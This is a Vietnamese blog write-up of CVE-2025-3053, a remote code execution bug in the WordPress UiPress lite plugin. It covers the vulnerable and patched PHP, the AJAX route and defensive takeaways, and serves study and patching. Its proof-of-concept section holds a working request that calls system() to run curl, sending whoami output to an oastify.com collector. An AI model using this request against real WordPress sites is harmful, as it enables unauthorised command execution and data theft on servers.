# CVE-2025-3053 Analysis & POC


<!--more-->

## CVE & Basic Info
**UiPress lite** | plugin tạo **custom dashboards**, **admin themes** và **pages** cho **WordPress** một cách dễ dàng tồn tại lỗ hổng **Remote Code Execution** trong tất cả các phiên bản đến và bao gồm **3.5.07** thông qua hàm **uip_process_form_input()**. Nguyên nhân là do hàm này lấy các **input do người dùng cung cấp** để thực thi các **hàm tùy ý** với **dữ liệu tùy ý**, và **không có bất kỳ kiểm tra capability nào**. Điều này khiến các **attackers đã xác thực**, với quyền truy cập cấp **Subscriber** trở lên, có thể **thực thi mã tùy ý** trên **máy chủ**.

* **CVE ID**: [CVE-2025-3053](https://www.cve.org/CVERecord?id=CVE-2025-3053)
* **Vulnerability Type**: Remote Code Execution
* **Affected Versions**: <= 3.5.07
* **Patched Versions**: 3.5.08
* **CVSS severity**: High (8.8)
* **Required Privilege**: Subcriber
* **Product**: [WordPress UiPress lite Plugin](https://wordpress.org/plugins/uipress-lite/)

## Requirements
* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **UiPress lite**:  
    * `3.5.07` – **vulnerable**  
    * `3.5.08` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ diff nào.

## Cause
**Trong phiên bản lỗi (v3.5.07):**

```php {title="ajax-functions.php v3.5.07" data-open=true hl_lines=[6,9,17]}
public function uip_process_form_input()
{
    // Check security nonce and 'DOING_AJAX' global
    Ajax::check_referer();

    $data = json_decode(stripslashes($_POST["formData"]));
    $data = Sanitize::clean_input_with_code($data);

    $userFunction = sanitize_text_field($_POST["userFunction"]);

    if (!function_exists($userFunction)) {
        Ajax::error(__('Passed function doesn\'t exist', "uipress-lite"));
    }

    // Try to start user supplied function
    try {
        $userFunction($data);
    } catch (Exception $e) {
        // Catch function error
        Ajax::error($e->getMessage());
    }

    $returndata = [];
    $returndata["success"] = true;
    wp_send_json($returndata);
}
```

Hàm `uip_process_form_input()` được gọi thông qua AJAX và chỉ dựa vào `Ajax::check_referer()` để kiểm tra nonce và xác nhận yêu cầu đang chạy trong ngữ cảnh `DOING_AJAX`. Cơ chế này **không kiểm tra quyền (capability) của người dùng** như `current_user_can()`, mà chỉ xác minh tính hợp lệ của yêu cầu. Vì vậy, người dùng đã xác thực (Subscriber trở lên) có thể chỉ định bất kỳ hàm PHP hợp lệ nào → dẫn đến **Remote Code Execution (RCE)**.

```php {title="Ajax.php v3.5.07" data-open=true hl_lines=[4]}
public static function check_referer()
{
    $doingAjax = defined("DOING_AJAX") && DOING_AJAX ? true : false;
    $referer = check_ajax_referer("uip-security-nonce", "security") > 0 ? true : false;
    $result = $doingAjax && $referer ? true : false;

    // Abort if not doing ajax or bad referer
    if (!$result) {
        $message = __("Unable to perform action", "uipress-lite");
        self::error($message);
    }
}
```

Dữ liệu từ `$_POST["formData"]` được xử lý bằng `stripslashes()` rồi đưa vào `json_decode()`, vì vậy `$data` thường là một **`stdClass`** (hoặc kiểu dữ liệu tương ứng với nội dung JSON). Sau đó giá trị này được truyền thêm qua `Sanitize::clean_input_with_code()`, tuy có tác dụng lọc dữ liệu, nhưng **không kiểm soát việc thực thi hàm**.

> [!TIP]
> Nếu truyền `$_POST["formData"]` ở dạng chuỗi mà không phải dạng JSON "{}" thì `json_decode()` sẽ trả về chuỗi mà không phải **`stdClass`**. Ta có thể control `$data` một cách trọn vẹn nhất

Tiếp theo, tên hàm được lấy từ `$_POST["userFunction"]` và chỉ được kiểm tra bằng `function_exists()`. Điều này có nghĩa là **bất kỳ hàm PHP hợp lệ nào đang tồn tại trong môi trường WordPress/PHP đều có thể được gọi**, miễn là attacker biết hoặc đoán được tên hàm đó.

Cuối cùng, dòng `$userFunction($data);` thực hiện **dynamic function call** với tham số là dữ liệu do người dùng gửi lên. Việc cho phép người dùng kiểm soát trực tiếp tên hàm được gọi, mà không dùng whitelist và không kiểm tra quyền, tạo ra **lỗ hổng Remote Code Execution (RCE)** hoặc ít nhất là **Arbitrary Function Call**, cho phép attacker đã xác thực (ví dụ: Subscriber trở lên) gọi các hàm nguy hiểm như `system()`, `exec()`, `shell_exec()`, `eval()`… từ đó có thể thực thi lệnh trên máy chủ hoặc thao túng hệ thống.

**Bản vá (v3.5.08):** 

```php {title="ajax-functions.php v3.5.08" data-open=true hl_lines=[4,6]}
public function uip_process_form_input()
{
    // Check security nonce and 'DOING_AJAX' global
    Ajax::check_referer();

    Ajax::error(__("Passing form data to user specified functions has been disabled to prevent potential security issues.", "uipress-lite"));
}
```

Bản vá đã vá lại bằng cách loại bỏ logic của hàm này :)).

![Diff](diff.png "Sự thay đổi của bản vá")

## Analysis

```php {title="ajax-functions.php v3.5.07" data-open=true hl_lines=[13]}
public function load_ajax()
{
    $function_names = [
        "uip_get_users_and_roles",
        "uip_get_post_types",
        "uip_get_recent_posts",
        "uip_get_posts_for_table",
        "uip_get_post_table_columns",
        "uip_delete_post",
        "uip_save_user_preference",
        "uip_get_user_preference",
        "uip_search_content",
        "uip_process_form_input",
        "uip_send_form_email",
        "uip_save_form_as_option",
        "uip_save_form_as_user_option",
        "uip_pre_populate_form_data",
        "uip_create_frame_switch",
        "uip_get_sync_options",
        "uip_refresh_sync_key",
        "uip_save_sync_options",
        "uip_start_site_sync",
        "uip_check_for_template_updates",
        "uip_process_block_query",
        "uip_save_site_option",
        "uip_send_message_to_gpt",
        "uip_global_export",
        "uip_global_import",
        "uip_push_new_custom_menu_items",
        "uip_remove_custom_menu_items",
    ];

    // Push ajax actions
    foreach ($function_names as $name) {
        add_action("wp_ajax_{$name}", [$this, $name]);
    }
}
```

Plugin đăng ký một loạt các AJAX action thông qua hàm `load_ajax()`, mỗi tên trong mảng `$function_names` được gắn với `add_action("wp_ajax_{$name}", [$this, $name])`. Điều này có nghĩa là khi gửi yêu cầu đến `/wp-admin/admin-ajax.php` kèm tham số `action = $name`, WordPress sẽ gọi trực tiếp phương thức có cùng tên trong class của plugin.

Trong danh sách này có `uip_process_form_input`, vì vậy một request như:

```
POST /wp-admin/admin-ajax.php
action=uip_process_form_input&security=...&formData=...&userFunction=...
```

sẽ kích hoạt hàm `uip_process_form_input()`.

## Flow

{{< mermaid >}}
graph TD
A["POST /wp-admin/admin-ajax.php...action=uip_process_form_input"] --> B["WordPress gọi uip_process_form_input()"]
B --> C["Ajax::check_referer()"]
C --> D["$data = json_decode(formData)"]
D --> E["$userFunction = sanitize_text_field(userFunction)"]
E --> F{"function_exists($userFunction)?"}
F -->|Yes| G["$userFunction($data)"]
F -->|No| H["Ajax::error()"]
G --> I["wp_send_json(success)"]
{{< /mermaid >}}

## Proof of Concept (PoC)
1. Đăng nhập với user **Subcriber**
2. Lấy security từ response

![Security value](security.png "Giá trị security")

3. Gửi request chứa payload:

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
...
action=uip_process_form_input&security=65c1a4e801&formData="curl+http://1aclwhon6rw1l1bj569pxpkjqaw1ks8h.oastify.com?leadked=$(whoami)"&userFunction=system
```

![Result](result.png "Kết quả")

## Conclusion

Lỗ hổng **CVE-2025-3053** xuất phát từ việc `uip_process_form_input()` cho phép người dùng kiểm soát trực tiếp **tên hàm được thực thi** thông qua `userFunction`, chỉ kiểm tra bằng `function_exists()` và **không có capability check hay whitelist**. Điều này khiến người dùng đã xác thực ở mức thấp (Subscriber) có thể thực hiện **Arbitrary Function Call**, dẫn tới **Remote Code Execution (RCE)**. Phiên bản **3.5.08** đã khắc phục bằng cách vô hiệu hóa hoàn toàn cơ chế này.

## Key Takeaways

* Không cho phép user kiểm soát **dynamic function call** nếu không có whitelist.
* `nonce` / `check_ajax_referer()` **không thay thế** cho `current_user_can()`.
* `function_exists()` **không phải cơ chế bảo mật**.
* Lỗi logic nguy hiểm hơn sanitize sai dữ liệu.
* Luôn áp dụng nguyên tắc **least privilege** cho các AJAX endpoint.

## References

[Remote Code Execution (RCE)](https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/)

[WordPress UiPress lite Plugin <= 3.5.07 is vulnerable to Remote Code Execution (RCE)](https://patchstack.com/database/wordpress/plugin/uipress-lite/vulnerability/wordpress-uipress-lite-plugin-3-5-07-authenticated-subscriber-remote-code-execution-vulnerability)

---

> Tác giả: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-12-01-cve-2025-3053/  

